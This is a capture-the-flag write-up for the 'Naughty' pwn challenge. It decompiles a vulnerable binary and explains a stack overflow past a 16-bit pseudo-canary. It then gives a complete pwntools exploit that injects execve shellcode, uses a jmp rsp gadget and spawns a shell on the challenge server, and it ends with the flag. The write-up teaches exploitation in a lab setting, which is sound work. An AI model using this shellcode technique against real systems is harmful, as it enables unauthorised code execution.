# Naughty

## Overview

We receive a file called `chall`. NX is disabled, which is helpful. We inject shellcode, [use a `jmp rsp` gadget](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode#using-rsp) and execute our own shellcode.

## Decompilation

`main()` is a fairly simple binary:

```c
int main(int a1, char **a2, char **a3)
{
  char input[46]; // [rsp+0h] [rbp-30h] BYREF
  __int16 check; // [rsp+2Eh] [rbp-2h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  
  check = -6913;
  puts("Tell Santa what you want for XMAS");
  fgets(input, 71, stdin);
  puts("Nice. Hope you haven't been naughty");
  if ( check != -6913 )
  {
    puts("Oh no....no gifts for you this year :((");
    exit(0);
  }
  return 0LL;
}
```

The buffer is `48` bytes long. After the buffer there is 16-bit integer `check`, which acts as a canary. Then there are 8 bytes for the stored RBP. The total input it `71`, meaning after the stored RBP we have 13 bytes of overflow, **including the RIP**. No ROP is possible.

Note that the value `-6913` is actually `0xe4ff`.

This was rather misleading as they gave you the LIBC.

## Exploitation

Firstly:

```python
from pwn import *

elf = context.binary = ELF('./chall', checksec=False)

if args.REMOTE:
    p = remote('challs.xmas.htsp.ro', 2000)
else:
    p = process()

jump_rsp = 0x40067f
```

Now we need some shellcode. pwntools' `shellcraft.sh()` is `2` bytes too long, so we'll have to make it manually.

The general payload is as follows:

* `/bin/sh\x00` so we have it in a known location \(relative to RSP\)
* Shellcode
* Padding
* `0xe4ff` to overwrite the pseudo-canary
* Padding
* `jmp rsp`

Now we need to decide _what_ shellcode we want to run. Well, since RSP points at the stack, we know that it will **always be a static offset off our buffer**. If we calculate it, we can just do

```text
sub rsp, x
jmp rsp
```

And execute the other half of our code! And at this point RSP will be exactly `8` bytes off `/bin/sh\x00`, so we can use it to populate RDI as well!

```python
exploit = b'/bin/sh\x00'
exploit += asm('''
    xor rsi, rsi
    xor rdx, rdx
    lea rdi, [rsp-8]
    mov rax, 0x3b
    syscall
''')    # rsi/rdx need to be null, rdi points at /bin/sh, rax execve syscall number
exploit += b'A' * (46 - len(exploit))    # padding
exploit += p16(0xe4ff)
exploit += b'B' * 8
exploit += p64(jump_rsp)
exploit += asm('''
    sub rsp, 0x38
    jmp rsp
''')    # RSP point to beginning of shellcode, use this to point RIP there
 
p.sendline(exploit)
p.interactive()
```

`X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}`

